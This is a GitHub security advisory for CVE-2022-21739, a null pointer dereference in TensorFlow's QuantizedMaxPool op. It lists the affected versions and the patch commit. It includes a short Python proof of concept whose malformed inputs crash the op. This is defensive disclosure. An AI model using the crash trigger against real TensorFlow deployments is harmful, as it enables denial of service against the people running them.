# [H] Null pointer dereference in TensorFlow

## Summary
Severity: High
Advisory: GHSA-3mw4-6rj6-74g5
CVE: CVE-2022-21739
CWE: CWE-476
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-02-09
Source: https://github.com/advisories/GHSA-3mw4-6rj6-74g5
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.5.3
- PyPI: `tensorflow` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow` — affected >=2.7.0 <2.7.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.5.3
- PyPI: `tensorflow-cpu` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow-cpu` — affected >=2.7.0 <2.7.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.5.3
- PyPI: `tensorflow-gpu` — affected >=2.6.0 <2.6.3
- PyPI: `tensorflow-gpu` — affected >=2.7.0 <2.7.1

## Details
### Impact 
The [implementation of `QuantizedMaxPool`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/quantized_pooling_ops.cc#L114-L130) has an undefined behavior where user controlled inputs can trigger a reference binding to null pointer.

```python
import tensorflow as tf

tf.raw_ops.QuantizedMaxPool(
    input = tf.constant([[[[4]]]], dtype=tf.quint8),
    min_input = [],
    max_input = [1],
    ksize = [1, 1, 1, 1],
    strides = [1, 1, 1, 1],
    padding = "SAME", name=None
)
```

### Patches
We have patched the issue in GitHub commit [53b0dd6dc5957652f35964af16b892ec9af4a559](https://github.com/tensorflow/tensorflow/commit/53b0dd6dc5957652f35964af16b892ec9af4a559).

The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-3mw4-6rj6-74g5
- https://nvd.nist.gov/vuln/detail/CVE-2022-21739
- https://github.com/tensorflow/tensorflow/commit/53b0dd6dc5957652f35964af16b892ec9af4a559
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2022-63.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2022-118.yaml
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/quantized_pooling_ops.cc#L114-L130
